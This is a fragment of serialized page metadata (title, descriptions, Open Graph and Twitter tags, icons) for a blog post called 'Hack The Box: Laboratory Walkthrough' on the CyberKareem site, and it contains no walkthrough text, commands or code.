notes."}],["$","meta","14",{"property":"og:url","content":"https://cyberkareem.com/writing/hackthebox-laboratory-walkthrough/"}],["$","meta","15",{"property":"og:site_name","content":"CyberKareem"}],["$","meta","16",{"property":"og:locale","content":"en_US"}],["$","meta","17",{"property":"og:image","content":"https://cyberkareem.com/writing/covers/hackthebox-laboratory-walkthrough.webp"}],["$","meta","18",{"property":"og:image:width","content":"300"}],["$","meta","19",{"property":"og:image:height","content":"300"}],["$","meta","20",{"property":"og:image:alt","content":"Hack The Box Laboratory machine avatar"}],["$","meta","21",{"property":"og:type","content":"article"}],["$","meta","22",{"property":"article:published_time","content":"2026-06-11T12:55:01.000Z"}],["$","meta","23",{"property":"article:modified_time","content":"2026-07-12T00:00:00.000Z"}],["$","meta","24",{"property":"article:author","content":"https://cyberkareem.com"}],["$","meta","25",{"name":"twitter:card","content":"summary_large_image"}],["$","meta","26",{"name":"twitter:creator","content":"@CyberKareem"}],["$","meta","27",{"name":"twitter:title","content":"Hack The Box: Laboratory Walkthrough"}],["$","meta","28",{"name":"twitter:description","content":"An archived walkthrough of the retired Hack The Box Laboratory machine, preserved from Abdullah Kareem's OSWE Prep preparation notes."}],["$","meta","29",{"name":"twitter:image","content":"https://cyberkareem.com/writing/covers/hackthebox-laboratory-walkthrough.webp"}],["$","link","30",{"rel":"icon","href":"/icon.svg","type":"image/svg+xml"}],["$","link","31",{"rel":"icon","href":"/icon-192.png","type":"image/png","sizes":"192x192"}],["$","link","32",{"rel":"icon","href":"/icon-512.png","type":"image/png","sizes":"512x512"}],["$","link","33",{"rel":"apple-touch-icon","href":"/apple-touch-icon.png","sizes":"180x180"}],["$","$L2d","34",{}]]
+1c:[["$","title","0",{"children":"Hack The Box: Laboratory Walkthrough | CyberKareem"}],["$","meta","1",{"name":"description","content":"An authorized-lab walkthrough of Hack The Box Laboratory, covering the attack path, validation steps, and practical lessons."}],["$","meta","2",{"name":"application-name","content":"CyberKareem"}],["$","link","3",{"rel":"author","href":"https://cyberkareem.com"}],["$","meta","4",{"name":"author","content":"Abdullah Kareem"}],["$","link","5",{"rel":"manifest","href":"/site.webmanifest","crossOrigin":"$undefined"}],["$","meta","6",{"name":"keywords","content":"CyberKareem,Abdullah Kareem,security researcher,penetration tester,CVE researcher,offensive security,responsible disclosure,web application penetration testing,API security assessment,mobile application security,application security consulting"}],["$","meta","7",{"name":"referrer","content":"strict-origin-when-cross-origin"}],["$","meta","8",{"name":"creator","content":"Abdullah Kareem"}],["$","meta","9",{"name":"publisher","content":"CyberKareem"}],["$","meta","10",{"name":"robots","content":"noindex, follow"}],["$","link","11",{"rel":"canonical","href":"https://cyberkareem.com/writing/hackthebox-laboratory-walkthrough/"}],["$","meta","12",{"property":"og:title","content":"Hack The Box: Laboratory Walkthrough"}],["$","meta","13",{"property":"og:description","content":"An authorized-lab walkthrough of Hack The Box Laboratory, covering the attack path, validation steps, and practical lessons."}],["$","meta","14",{"property":"og:url","content":"https://cyberkareem.com/writing/hackthebox-laboratory-walkthrough/"}],["$","meta","15",{"property":"og:site_name","content":"CyberKareem"}],["$","meta","16",{"property":"og:locale","content":"en_US"}],["$","meta","17",{"property":"og:image","content":"https://cyberkareem.com/writing/covers/hackthebox-laboratory-walkthrough.webp"}],["$","meta","18",{"property":"og:image:width","content":"300"}],["$","meta","19",{"property":"og:image:height","content":"300"}],["$","meta","20",{"property":"og:image:alt","content":"Hack The Box Laboratory machine avatar"}],["$","meta","21",{"property":"og:type","content":"article"}],["$","meta","22",{"property":"article:published_time","content":"2026-06-11T12:55:01.000Z"}],["$","meta","23",{"property":"article:modified_time","content":"2026-07-12T00:00:00.000Z"}],["$","meta","24",{"property":"article:author","content":"https://cyberkareem.com"}],["$","meta","25",{"name":"twitter:card","content":"summary_large_image"}],["$","meta","26",{"name":"twitter:creator","content":"@CyberKareem"}],["$","meta","27",{"name":"twitter:title","content":"Hack The Box: Laboratory Walkthrough"}],["$","meta","28",{"name":"twitter:description","content":"An authorized-lab walkthrough of Hack The Box Laboratory, covering the attack path, validation steps, and practical lessons."}],["$","meta","29",{"name":"twitter:image","content":"https://cyberkareem.com/writing/covers/hackthebox-laboratory-walkthrough.webp"}],["$","link","30",{"rel":"icon","href":"/icon.svg","type":"image/svg+xml"}],["$","link","31",{"rel":"icon","href":"/icon-192.png","type":"image/png","sizes":"192x192"}],["$","link","32",{"rel":"icon","href":"/icon-512.png","type":"image/png","sizes":"512x512"}],["$","link","33",{"rel":"apple-touch-icon","href":"/apple-touch-icon.png","sizes":"180x180"}],["$","$L2d","34",{}]]
